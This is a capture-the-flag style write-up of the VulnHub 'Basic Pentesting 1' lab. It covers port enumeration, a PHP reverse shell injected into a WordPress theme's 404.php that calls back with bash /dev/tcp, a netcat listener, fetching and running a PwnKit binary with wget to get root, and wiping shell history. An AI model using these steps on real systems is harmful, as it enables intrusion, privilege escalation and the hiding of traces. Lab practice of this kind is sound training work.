# Target: VulnHub – Basic Pentesting 1  

### Engagement Overview
**Target:** Basic Pentesting 1 (VulnHub)  
**Box IP:** 192.168.56.102

---

## Objectives
- Regain WordPress admin access
- Inject PHP reverse shell via theme
- Get reverse shell to Kali
- Upgrade to interactive TTY
- Enumerate for privilege escalation vectors
- Exploit PwnKit to gain root
- Clean up artifacts

---

## Enumeration
- 22/tcp: OpenSSH 7.2p2
- 80/tcp: Apache httpd 2.4.18
- 139/tcp, 445/tcp: Samba smbd 3.X - 4.X
- Service detection, robots.txt, and WordPress login page found


**Key Findings:**

    OS: Ubuntu 16.04.3 LTS

    Kernel: 4.10.0-28-generic

    Local user: marlinspike

    No sudo access from www-data

    SUID binary found: /usr/bin/pkexec (used by PwnKit)

## Methodologies

PHP Reverse Shell via `404.php` in theme
  
## Initial Access

Weak admin authentication in WordPress

**Payload used:**

	<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"); ?>

**Triggered with:**

	curl "http://vtcsec/secret/wp-content/themes/twentyseventeen/404.php"

**Listener setup on Kali:**

	nc -lvnp 4444

Result:
Gained shell as www-data.

**Privilege Escalation**

Exploit: CVE-2021-4034 (PwnKit)
Approach: Static binary hosted on attacker machine

On Kali:

	python3 -m http.server 8000

On Target:

	cd /tmp
	wget http://192.168.56.10:8000/PwnKit -O PwnKit
	chmod +x PwnKit
	./PwnKit

Result:

	root@vtcsec:/tmp# whoami
	root

## House Cleaning
	rm /tmp/PwnKit
	history -c

Root shell obtained.

## Post-Exploitation

No persistence or root flag grabbed — purpose was shell lifecycle practice.

**Tools Utilized**

* nmap, gobuster, wpscan
* curl, netcat, wget, python3
* Metasploit (for ProFTPD attempt)
* Static PwnKit binary

**Key Takeaways**

* Always check /wp-login.php and XML-RPC for exposed WordPress logins
* Use encoded curl payloads to bypass broken command injection
* Static precompiled binaries save time vs. build errors (GLIBC mismatch)
* Do not use fg without setting proper terminal (stty raw -echo)
* After shell access, use enumeration before brute forcing — privilege escalation often lives in defaults